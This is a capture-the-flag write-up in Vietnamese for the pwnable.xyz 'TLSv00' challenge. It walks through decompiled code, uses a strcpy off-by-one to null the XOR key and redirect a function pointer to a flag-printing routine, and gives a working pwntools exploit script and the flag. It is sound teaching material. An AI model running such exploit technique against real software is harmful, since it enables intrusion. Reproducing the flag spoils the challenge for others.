# Pwnable.xyz TLSv00
## Analysis
```
void main(void)
{
  int choice;
  undefined4 size;
  
  setup();
  puts("Muahaha you thought I would never make a crypto chal?");
  generate_key(63);
  do {
    while( true ) {
      while( true ) {
        print_menu();
        printf("> ");
        choice = read_int32();
        if (choice != 2) break;
        load_flag();
      }
      if (choice < 3) break;
      if (choice == 3) {
        print_flag();
      }
      else if (choice != 4) goto invalid;
    }
    if (choice == 1) {
      printf("key len: ");
      size = read_int32();
      generate_key(size);
    }
    else {
invalid:
      puts("Invalid");
    }
  } while( true );
}
```
Chương trình cho ta 3 lựa chọn
+ 1: Generate key. Lưu ý lỗi offbyone tại hàm strcpy(key,buf)
```
void generate_key(uint size)
{
  int __fd;
  long in_FS_OFFSET;
  int i;
  char buf [72];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  if (((int)size < 1) || (64 < size)) {
    puts("Invalid key size");
  }
  else {
    memset(buf,0,72);
    __fd = open("/dev/urandom",0);
    if (__fd == -1) {
      puts("Can\'t open /dev/urandom");
                    /* WARNING: Subroutine does not return */
      exit(1);
    }
    read(__fd,buf,(long)(int)size);
    for (i = 0; i < (int)size; i = i + 1) {
      while (buf[i] == '\0') {
        read(__fd,buf + i,1);
      }
    }
    strcpy(key,buf);
    close(__fd);
  }
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```
+ 2: Load flag: đọc chuỗi từ /flag sau đó xor các ký tự của flag với các ký tự của key
```
void load_flag(void)
{
  int __fd;
  uint i;
  
  __fd = open("/flag",0);
  if (__fd == -1) {
    puts("Can\'t open flag");
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  read(__fd,flag,64);
  for (i = 0; i < 64; i = i + 1) {
    flag[(int)i] = flag[(int)i] ^ key[(int)i];
  }
  close(__fd);
  return;
}
```
+ 3: Print flag: thực ra là hàm đọc chuỗi đầu vào của user
```
void print_flag(void)
{
  int iVar1;
  
  puts("WARNING: NOT IMPLEMENTED.");
  if ((char)do_comment == '\0') {
    printf("Wanna take a survey instead? ");
    iVar1 = getchar();
    if (iVar1 == L'y') {
      do_comment = f_do_comment;
    }
    (*do_comment)();
  }
  return;
}

void f_do_comment(void)
{
  long in_FS_OFFSET;
  undefined local_38 [40];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  printf("Enter comment: ");
  read(0,local_38,33);
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
``` 
Ngoài ra, có thêm hàm real_print_flag:
```
void real_print_flag(void)
{
  printf("%s",flag);
  return;
}
```
## Solution
Vài điểm cần lưu ý:
+ Địa chỉ hàm f_do_comment là 0x0b1f, của hàm real_print_flag là 0x0b00. Mà giá trị của do_comment lại ở ngay dưới vùng chứa giá trị của key  
-> Tận dụng lỗi off by one thay đổi giá trị của do_comment từ 0x0b1f thành 0x0b00 (do strcpy ghi `size` byte sau đó thêm 1 byte null vào cuối)
+ Lỗi off by one của strcpy cũng được dùng để set tất cả ký tự của key về null (trừ ký tự đầu tiên) -> vô hiệu chức năng mã hóa do a ^ 0 = a
```
#!/usr/bin/python3
from pwn import *

context.binary = elf = ELF("./challenge", checksec = False)

#con = process()
#gdb.attach(con, gdbscript = "start")
con = remote("svc.pwnable.xyz", 30006)

def option1(size):
    con.sendlineafter(b"> ", b"1")
    con.sendlineafter(b"key len: ", size)

def option2():
    con.sendlineafter(b"> ", b"2")

def option3(msg):
    con.sendlineafter(b"> ", b"3")
    con.sendlineafter(b"instead? ", msg)

if __name__ == '__main__':
    option3(b"y")
    for i in range(64, 0, -1):
        option1(str(i).encode())
    option2()
    option3(b"n")

    con.interactive()
```
## Flag
```
FLAG{this_was_called_OTP_I_think}
```